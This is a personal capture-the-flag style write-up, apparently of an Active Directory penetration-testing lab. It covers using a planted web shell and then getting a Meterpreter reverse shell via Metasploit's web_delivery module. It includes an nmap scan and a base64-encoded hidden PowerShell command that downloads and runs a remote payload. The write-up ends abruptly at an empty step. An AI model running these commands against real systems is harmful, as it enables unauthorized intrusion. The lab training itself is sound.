The complete course is [[Index |here]]
# Background
A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: ***admin:My_W3bsH3ll_P@ssw0rd!*** in place for us to start from in the /uploads directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

# Question 1: Submit the contents of the flag.txt file on the administrator Desktop of the web server

## Nmap Scan
```
┌──(root㉿kali)-[/home/z3tssu/Downloads]
└─# nmap -p80,445,135,139 -v -Pn 10.129.202.242
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-14 21:19 +04
Initiating Parallel DNS resolution of 1 host. at 21:19
Completed Parallel DNS resolution of 1 host. at 21:19, 0.00s elapsed
Initiating SYN Stealth Scan at 21:19
Scanning 10.129.202.242 [4 ports]
Discovered open port 135/tcp on 10.129.202.242
Discovered open port 80/tcp on 10.129.202.242
Discovered open port 139/tcp on 10.129.202.242
Discovered open port 445/tcp on 10.129.202.242
Completed SYN Stealth Scan at 21:19, 0.28s elapsed (4 total ports)
Nmap scan report for 10.129.202.242
Host is up (0.25s latency).

PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

```

## Navigating the Webserver /uploads
The instructions basically gives us a credential and a URL path to go to
http://10.129.202.242/uploads/

```
admin:My_W3bsH3ll_P@ssw0rd!
```

this seems like a directory of some sort, lets enumerate further
1. Only the antak.aspx works

![[Pasted image 20251014213138.png]]

Once we browse to the antak.aspx, we are greeted with a login page

![[Pasted image 20251014213148.png]]

lets try and use the credentials here **admin:My_W3bsH3ll_P@ssw0rd!**
![[Pasted image 20251014213315.png]]

We have access using the given credentials

## Reading the Flag.txt contents
```
cat c:\users\administrator\desktop\flag.txt
```

![[Pasted image 20251014213814.png]]

# Question 2: Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer

We will have to elevate our privileges and get a proper shell on the target, lets do so using Meterpreter 

We will use the ***web_delivery*** exploit
## Use Metasploit 
```bash
msfconsole -q 
search web_delivery
use exploit/multi/script/web_delivery 
```
### Set the options
```
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST PWNIP
set SRVHOST PWNIP
set TARGET 2 
exploit
```
### Copy the payload to the target webserver's shell
```
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABlADEAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAZQAxAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAZQAxAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAxADcAOgA4ADAAOAAwAC8AWAB1AGEARQBmAHAAQwBDAGIAcAAzAHgAUQA1AC8AMwBoADAATQBqADUAeABuAEcAUABuAEYAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMQA3ADoAOAAwADgAMAAvAFgAdQBhAEUAZgBwAEMAQwBiAHAAMwB4AFEANQAnACkAKQA7AA==

```
### Shell Obtained in Meterpreter


## Download PowerView or Host
I already have it on my machine, but it can be downloaded here; [PowerTools/PowerView/powerview.ps1 at master · PowerShellEmpire/PowerTools · GitHub](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)
## Host PowerView using a Python Server (attacker Machine)
```
python -m http.server 9090 
```

## Download PowerView from the Target Machine
```

```

